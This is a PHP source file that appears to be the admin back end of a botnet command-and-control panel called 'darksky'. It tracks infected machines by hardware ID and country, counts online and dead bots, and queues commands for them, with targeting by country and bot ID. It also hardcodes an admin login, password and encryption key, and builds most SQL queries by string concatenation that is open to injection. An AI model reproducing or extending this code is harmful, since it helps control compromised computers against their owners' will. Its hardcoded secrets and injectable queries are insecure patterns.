<?
session_start();
	
	include_once('config/config.php');
	include_once('other/filter.php');
	include_once('GeoIP.inc');
	
	define('ENCRYPTION_KEY', 'e3f080b6edfcf6fff70654021c7c2e43');
	define('Login', 'uipix');
	define('pass', '33211qq');
	
	class Admin{
		
		var $date;
		
		function __construct(){
			$this->date = new DateTime(null, new DateTimeZone('Europe/Moscow'));
		}
	
		public function Check(){
		global $mysqli;
			if(isset($_SESSION['token'])){
				if(isset($_SESSION['data'])){
					if(strlen($this->decrypt($_SESSION['data'])) < 48){ //CURRENT_TIMESTAMP
						$login = $this->decrypt($_SESSION['data']);
						$sql = 'UPDATE "a_users" SET session = "'.session_id().'", activity = "'.date('y/m/d H:i:s').'" WHERE login = "'.$login.'" ';
						$res = $mysqli->query($sql);
							return true;	
						
					} else {
						session_unset();
						return false;
					}
				}
			} else {
				return false;
			}
			$mysqli->close();
			
		}
		
		public function CheckDark($hwid){
			global $mysqli;
			$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$hwid.'";';
			$res = $mysqli->query($sql_check);
			if($res->fetch_row() > 0){
				return false;
			} else {
				return true;
			}
			$mysqli->close();
		}
		
		public function GetBotID($param){
			global $mysqli;
			$str = json_decode($param, true);
			
			$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$str['hwid'].'";';
			$res = $mysqli->query($sql_check);
			$row = $res->fetch_row();
			if($row > 0){
				return $row[0];
			} else {
				return $row[0];
			}
			$mysqli->close();
		}
		
		public function UserInfos($method){
			$ip = $_SERVER['REMOTE_ADDR'];
			$gi = geoip_open('modules/GeoIP.dat', GEOIP_STANDARD);
			$countrycode = geoip_country_code_by_addr($gi, $ip);
            $country     = geoip_country_name_by_addr($gi, $ip);
				if ($countrycode == NULL) {
					$countrycode = 'XX';
				}
				if ($country == NULL) {
					$country = 'Unknown';
				}
				geoip_close($gi);
				if($method==0){return $ip;}
				if($method==1){return $countrycode;}
				if($method==2){return $country;}
		}
		

		
		public function CheckPassword($login, $pass){
	
			if(strlen($pass) > 0){
				if($pass == pass && $login == Login){
					session_unset();
					$_SESSION['token'] = session_id();
					$_SESSION['data'] = $this->encrypt($_GET['login']);
					return true;
				} else {
					return false;
				}
			} else {
				return false;
			}
		}
		
		public function DeleteUser($id){ //return num in massiv
			global $mysqli;
			$sql  = 'DELETE FROM darksky_users WHERE id = "'.$id.'"';
			$res = $mysqli->query($sql);
			return true;
			$mysqli->close();
		}
		
		public function CheckCountUsers(){
		global $mysqli;
		$sql = 'SELECT * FROM darksky_users WHERE 1';
		$result = $mysqli->query($sql);
		$row = $result->num_rows;
		return $row;
		$mysqli->close();
		}
		
		public function GetTime($type){
			$timeS = $this->date->getTimestamp();
			if($type == 0) return gmdate("Y-m-d", $timeS + (5400+1800));
			if($type == 1) return gmdate("h:i", $timeS + (5400+1800));
		}
		
		public function StatsFromDay($from){
		global $mysqli;
		
		$index = 0;
		$info1 = array();
		
		if($from == 'reg') $like = 'datereg LIKE "%'.$this->GetTime(0).'%" ';
		if($from == 'banned') $like = 'banned=1 AND datereg LIKE "%'.$this->GetTime(0).'%"';
		if($from == 'dead') $like = 'status=2 AND datereg LIKE "%'.$this->GetTime(0).'%"';
		
		$sql = 'SELECT * FROM darksky_users WHERE '.$like;
		$result = $mysqli->query($sql);
				while ($row = $result->fetch_assoc()){
						$info1[$index] = $row;
						$index++;
					}
				return $info1;
		$mysqli->close();
		}
		
		public function Times($str){
			return gmdate("m-d H:i", strtotime($str));
		}
		
		public function ClearLastCMD(){
		global $mysqli;
		$sql = 'DELETE From last_cmd WHERE 1';
		$result = $mysqli->query($sql);
		if(!$result){
			return false;
		} else {
			return true;
		}
		}

		public function UsersView($count){ //return num in massiv
			global $mysqli;		
			$index = 0;
			$max = 10;
			$sql  = 'SELECT * FROM darksky_users WHERE 1 ORDER BY status ASC,time Desc LIMIT '.$count*$max.', 10';
			if($this->CheckCountUsers() > 0){
			$result = $mysqli->query($sql);
			while ($row = $result->fetch_assoc()){
				$info1[$index] =	$row;
				$index++;
			}
			return $info1;
			} else {
				return '';
			}
			$mysqli->close();
		}
		
		public function StatsFromDayAOnline(){ //return num in massiv
			global $mysqli;		
			$index = 0;
			$sql  = 'SELECT * FROM `darksky_users` WHERE `time` > (UNIX_TIMESTAMP()-86400)';
			$result = $mysqli->query($sql);
			$row = $result->num_rows;
			return $row;
			$mysqli->close();
		}
		
		public function StatsFromDayADeadth(){ //return num in massiv
			global $mysqli;		
			$index = 0;
			$sql  = 'SELECT * FROM `darksky_users` WHERE `time` > (UNIX_TIMESTAMP()-86400) ';
			$result = $mysqli->query($sql);
			$row = $result->fetch_array();
			return $row[0];
			$mysqli->close();
		}
		
		public function GetOnline() {
			global $mysqli;
			$sql  = 'SELECT COUNT(1) FROM `darksky_users` WHERE `time` > (UNIX_TIMESTAMP()-900)';
			$result = $mysqli->query($sql);
			$row = $result->fetch_array();
			return $row[0];
			$mysqli->close();
		}
		
		
		public function GetOffline() {
			global $mysqli;
			$sql  = 'SELECT COUNT(1) FROM `darksky_users` WHERE `time` < (UNIX_TIMESTAMP()-900)';
			$result = $mysqli->query($sql);
			$row = $result->fetch_array();
			return $row[0];
			$mysqli->close();
		}
		
		public function GetDead() {
			global $mysqli;
			$sql  = 'SELECT COUNT(1) FROM `darksky_users` WHERE `time` < (UNIX_TIMESTAMP()-86400)';
			$result = $mysqli->query($sql);
			$row = $result->fetch_array();
			return $row[0];
			$mysqli->close();
		}
		
		public function AllUsers(){ //return num in massiv
			global $mysqli;		
			$index = 0;
			$sql  = 'SELECT * FROM darksky_users WHERE 1';
			if($this->CheckCountUsers() > 0){
			$result = $mysqli->query($sql);
			while ($row = $result->fetch_assoc()){
				$info1[$index] =	$row;
				$index++;
			}
			return $info1;
			} else {
				return '';
			}
			$mysqli->close();
		}
		
		public function SetSTATUS() {
			global $mysqli;
			$people = $this->AllUsers();
			$i = 0;
			for($i = 0, $size = count($people); $i < $size; ++$i) {
    			if($people[$i]['status'] == '1'){
    				$s = 'UPDATE `darksky_users` SET status="0" WHERE id='.$people[$i]['id'];
    				$mysqli->query($s);
    			}
   		}
   		$mysqli->close();
   		return true;
   	}
		
		public function ClearCommand($id) {
			global $mysqli;
			$sql  = 'DELETE FROM cmd WHERE id='.$id;
			$result = $mysqli->query($sql);
			return $result;
			$mysqli->close();
		}
		
		public function AddCommand($s1, $s2, $s3, $s4){
			global $mysqli;
			$a1 = $s1;
			$a2 = $mysqli->real_escape_string($s2);
			$a3 = $mysqli->real_escape_string($s3);
			$a4 = $mysqli->real_escape_string($s4);
			$sql  = "INSERT INTO cmd (`id`, `cmd`, `amount`, `done`, `country`, `forid`) VALUES ('NULL', '$a1', '.$a2.', '0', '$a3', '$a4');";
			$res = $mysqli->query($sql);
			return $res;
			$mysqli->close();
		}
		
		public function CheckCommandsCount(){
		global $mysqli;
		$sql = 'SELECT * FROM cmd WHERE 1';
		$result = $mysqli->query($sql);
		$row = $result->num_rows;
		return $row;
		$mysqli->close();
		}
		

		
		public function GetViews(){
			global $mysqli;
			$index = 0;
			$info1 =array();
			$sql = 'SELECT * FROM last_cmd WHERE 1 ';
			$result = $mysqli->query($sql);
			while ($row = $result->fetch_assoc()){
				$info1[$index] = $row;
				$index++;
			}
			return $info1;
			$mysqli->close();
		}
		
		public function SetLastCmd($idbot, $idcmd){
		global $mysqli;
		$sql = 'SELECT * FROM last_cmd WHERE idcmd = '.$idcmd.' AND idbot = '.$idbot.' ';
		$ddd = $mysqli->query($sql);
		$col = $ddd->num_rows;
		if($col < 1){
			$sql = "INSERT INTO `last_cmd` (`idbot`, `idcmd`, `viewed`) VALUES ('$idbot', '$idcmd', '1')";
			$result = $mysqli->query($sql);
			return true;
		} else {
			return false;
		}
		$mysqli->close();
		}
		
		public function SetCommandViewed($id){
		global $mysqli;
			$mysqli->query('UPDATE cmd SET `done` = `done` + 1 WHERE id='.$id);
			return true;
		$mysqli->close();
		}
		
		public function CountCommandsForBot(){
			global $mysqli;
			$sqls  = 'SELECT * FROM cmd WHERE 1';
			$result = $mysqli->query($sqls);
			$rows = $result->num_rows;
			return $rows;
		$mysqli->close();
		}
		
		public function GetCommandForBot() {
			global $mysqli;
			$index = 0;
			$sqls  = 'SELECT * FROM cmd WHERE 1';
			$result = $mysqli->query($sqls);
				while ($row = $result->fetch_assoc()){
					$cmds[$index] = $row;
					$index++;
				}
			return $cmds;
			$mysqli->close();
		}
	
		public function UserExit(){
			session_unset();
			session_destroy();
			return true;
			$this->GoHome();
		}
		
		public function GoHome($boolean){
			if ($boolean == true) {
			    header('Location: '.$_SERVER['HTTP_REFERER']);
			return true;
			}
		}
		
		public function DeleteLog(){
		$myFile = './log.log';
		$fh = fopen($myFile, 'w');
		fclose($fn);
		return true;
		}
		
		public function encrypt($decrypted) {
		$key = ENCRYPTION_KEY;
		  $ekey = hash('SHA256', $key, true);
		  srand(); $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_RAND);
		  if (strlen($iv_base64 = rtrim(base64_encode($iv), '=')) != 22) return false;
		  $encrypted = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $ekey, $decrypted . md5($decrypted), MCRYPT_MODE_CBC, $iv));
		  return $iv_base64 . $encrypted;
		}
		 
		public function decrypt($encrypted) {
		$key = ENCRYPTION_KEY;
		  $ekey = hash('SHA256', $key, true);
		  $iv = base64_decode(substr($encrypted, 0, 22) . '==');
		  $encrypted = substr($encrypted, 22);
		  $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $ekey, base64_decode($encrypted), MCRYPT_MODE_CBC, $iv), "\0\4");
		  $hash = substr($decrypted, -32);
		  $decrypted = substr($decrypted, 0, -32);
		  if (md5($decrypted) != $hash) return false;
		  return $decrypted;
		}
		
		public function GetCommand() {
			global $mysqli;
			$index = 0;
			$sqls  = 'SELECT * FROM last_cmd WHERE 1';
			$result = $mysqli->query($sqls);
			while ($row = $result->fetch_assoc()){
					$cmdall[$index] = $row;
					$index++;
			}
			return $cmdall;
			$mysqli->close();
		}
	
		
		function clear($param){
		  $param = addslashes($param); 
		  $param = htmlspecialchars ($param); 
		  //$param = preg_replace("/[^a-z0-9]\//i", "", $param);  
		  return $param;
		}
		
		public function code_to_country($code){
			$code = strtoupper($code);
			$countryList = array('XX' => 'Unknown','AF' => 'Afghanistan','AX' => 'Aland Islands','AL' => 'Albania','DZ' => 'Algeria','AS' => 'American Samoa','AD' => 'Andorra','AO' => 'Angola','AI' => 'Anguilla','AQ' => 'Antarctica','AG' => 'Antigua and Barbuda','AR' => 'Argentina','AM' => 'Armenia','AW' => 'Aruba','AU' => 'Australia','AT' => 'Austria','AZ' => 'Azerbaijan','BS' => 'Bahamas the','BH' => 'Bahrain','BD' => 'Bangladesh','BB' => 'Barbados','BY' => 'Belarus','BE' => 'Belgium','BZ' => 'Belize','BJ' => 'Benin','BM' => 'Bermuda','BT' => 'Bhutan','BO' => 'Bolivia','BA' => 'Bosnia and Herzegovina','BW' => 'Botswana','BV' => 'Bouvet Island (Bouvetoya)','BR' => 'Brazil','IO' => 'British Indian Ocean Territory (Chagos Archipelago)','VG' => 'British Virgin Islands','BN' => 'Brunei Darussalam','BG' => 'Bulgaria','BF' => 'Burkina Faso','BI' => 'Burundi','KH' => 'Cambodia','CM' => 'Cameroon','CA' => 'Canada','CV' => 'Cape Verde','KY' => 'Cayman Islands','CF' => 'Central African Republic','TD' => 'Chad','CL' => 'Chile','CN' => 'China','CX' => 'Christmas Island','CC' => 'Cocos (Keeling) Islands','CO' => 'Colombia','KM' => 'Comoros the','CD' => 'Congo','CG' => 'Congo the','CK' => 'Cook Islands','CR' => 'Costa Rica','CI' => 'Cote d\'Ivoire','HR' => 'Croatia','CU' => 'Cuba','CY' => 'Cyprus','CZ' => 'Czech Republic','DK' => 'Denmark','DJ' => 'Djibouti','DM' => 'Dominica','DO' => 'Dominican Republic','EC' => 'Ecuador','EG' => 'Egypt','SV' => 'El Salvador','GQ' => 'Equatorial Guinea','ER' => 'Eritrea','EE' => 'Estonia','ET' => 'Ethiopia','FO' => 'Faroe Islands','FK' => 'Falkland Islands (Malvinas)','FJ' => 'Fiji the Fiji Islands','FI' => 'Finland','FR' => 'France, French Republic','GF' => 'French Guiana','PF' => 'French Polynesia','TF' => 'French Southern Territories','GA' => 'Gabon','GM' => 'Gambia the','GE' => 'Georgia','DE' => 'Germany','GH' => 'Ghana','GI' => 'Gibraltar','GR' => 'Greece','GL' => 'Greenland','GD' => 'Grenada','GP' => 'Guadeloupe','GU' => 'Guam','GT' => 'Guatemala','GG' => 'Guernsey','GN' => 'Guinea','GW' => 'Guinea-Bissau','GY' => 'Guyana','HT' => 'Haiti','HM' => 'Heard Island and McDonald Islands','VA' => 'Holy See (Vatican City State)','HN' => 'Honduras','HK' => 'Hong Kong','HU' => 'Hungary','IS' => 'Iceland','IN' => 'India','ID' => 'Indonesia','IR' => 'Iran','IQ' => 'Iraq','IE' => 'Ireland','IM' => 'Isle of Man','IL' => 'Israel','IT' => 'Italy','JM' => 'Jamaica','JP' => 'Japan','JE' => 'Jersey','JO' => 'Jordan','KZ' => 'Kazakhstan','KE' => 'Kenya','KI' => 'Kiribati','KP' => 'Korea','KR' => 'Korea','KW' => 'Kuwait','KG' => 'Kyrgyz Republic','LA' => 'Lao','LV' => 'Latvia','LB' => 'Lebanon','LS' => 'Lesotho','LR' => 'Liberia','LY' => 'Libyan Arab Jamahiriya','LI' => 'Liechtenstein','LT' => 'Lithuania','LU' => 'Luxembourg','MO' => 'Macao','MK' => 'Macedonia','MG' => 'Madagascar','MW' => 'Malawi','MY' => 'Malaysia','MV' => 'Maldives','ML' => 'Mali','MT' => 'Malta','MH' => 'Marshall Islands','MQ' => 'Martinique','MR' => 'Mauritania','MU' => 'Mauritius','YT' => 'Mayotte','MX' => 'Mexico','FM' => 'Micronesia','MD' => 'Moldova','MC' => 'Monaco','MN' => 'Mongolia','ME' => 'Montenegro','MS' => 'Montserrat','MA' => 'Morocco','MZ' => 'Mozambique','MM' => 'Myanmar','NA' => 'Namibia','NR' => 'Nauru','NP' => 'Nepal','AN' => 'Netherlands Antilles','NL' => 'Netherlands the','NC' => 'New Caledonia','NZ' => 'New Zealand','NI' => 'Nicaragua','NE' => 'Niger','NG' => 'Nigeria','NU' => 'Niue','NF' => 'Norfolk Island','MP' => 'Northern Mariana Islands','NO' => 'Norway','OM' => 'Oman','PK' => 'Pakistan','PW' => 'Palau','PS' => 'Palestinian Territory','PA' => 'Panama','PG' => 'Papua New Guinea','PY' => 'Paraguay','PE' => 'Peru','PH' => 'Philippines','PN' => 'Pitcairn Islands','PL' => 'Poland','PT' => 'Portugal, Portuguese Republic','PR' => 'Puerto Rico','QA' => 'Qatar','RE' => 'Reunion','RO' => 'Romania','RU' => 'Russian Federation','RW' => 'Rwanda','BL' => 'Saint Barthelemy','SH' => 'Saint Helena','KN' => 'Saint Kitts and Nevis','LC' => 'Saint Lucia','MF' => 'Saint Martin','PM' => 'Saint Pierre and Miquelon','VC' => 'Saint Vincent and the Grenadines','WS' => 'Samoa','SM' => 'San Marino','ST' => 'Sao Tome and Principe','SA' => 'Saudi Arabia','SN' => 'Senegal','RS' => 'Serbia','SC' => 'Seychelles','SL' => 'Sierra Leone','SG' => 'Singapore','SK' => 'Slovakia (Slovak Republic)','SI' => 'Slovenia','SB' => 'Solomon Islands','SO' => 'Somalia, Somali Republic','ZA' => 'South Africa','GS' => 'South Georgia and the South Sandwich Islands','ES' => 'Spain','LK' => 'Sri Lanka','SD' => 'Sudan','SR' => 'Suriname','SJ' => 'Svalbard & Jan Mayen Islands','SZ' => 'Swaziland','SE' => 'Sweden','CH' => 'Switzerland, Swiss Confederation','SY' => 'Syrian Arab Republic','TW' => 'Taiwan','TJ' => 'Tajikistan','TZ' => 'Tanzania','TH' => 'Thailand','TL' => 'Timor-Leste','TG' => 'Togo','TK' => 'Tokelau','TO' => 'Tonga','TT' => 'Trinidad and Tobago','TN' => 'Tunisia','TR' => 'Turkey','TM' => 'Turkmenistan','TC' => 'Turks and Caicos Islands','TV' => 'Tuvalu','UG' => 'Uganda','UA' => 'Ukraine','AE' => 'United Arab Emirates','GB' => 'United Kingdom','US' => 'United States of America','UM' => 'United States Minor Outlying Islands','VI' => 'United States Virgin Islands','UY' => 'Uruguay, Eastern Republic of','UZ' => 'Uzbekistan','VU' => 'Vanuatu','VE' => 'Venezuela','VN' => 'Vietnam', 'WF' => 'Wallis and Futuna', 'EH' => 'Western Sahara', 'YE' => 'Yemen','ZM' => 'Zambia','ZW' => 'Zimbabwe');
			return $countryList[$code];
			}
		
	}

?>